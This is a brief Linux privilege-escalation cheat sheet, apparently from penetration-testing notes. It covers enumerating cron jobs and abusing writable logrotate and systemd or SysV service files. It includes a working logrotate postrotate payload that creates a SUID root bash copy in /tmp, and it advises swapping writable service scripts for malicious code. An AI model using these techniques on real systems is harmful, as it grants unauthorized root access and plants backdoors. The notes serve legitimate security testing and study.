## Cron
**List All Cron Jobs**
```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/
ls -la /var/spool/cron/crontabs/
```
- Check for writable directories with scripts / what the script is calling
## Logrotate-Based Escapes
```bash
ls -la /etc/logrotate.d/
cat /etc/logrotate.conf
```
If you can write to a file in `/etc/logrotate.d/`, add a `postrotate` script that creates a SUID binary:
```bash
/var/log/myapp/*.log {
    daily
    missingok
    rotate 7
    notifempty
    compress
    sharedscripts
    postrotate
        cp /bin/bash /tmp/rootbash
        chmod +s /tmp/rootbash
    endscript
}
```
## Systemd & SysV Init Scripts
**List Systemd Service Files**
```bash
ls -la /etc/systemd/system/*.service
ls -la /lib/systemd/system/*.service
```
**Inspect Service File Contents**
```bash
cat /etc/systemd/system/vulnerable.service
```
Look for fields like `ExecStart=/usr/bin/somescript.sh`. If `somescript.sh` is writable, replace it with malicious code.
Check for Writable `/etc/default` or `/etc/sysconfig` Files
Many SysV init scripts source configuration from `/etc/default/servicename` or `/etc/sysconfig/servicename`. If writable, you can modify the environment the service runs in or the path to the binary.
**Reload & Restart Service to Trigger Execution**
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
```
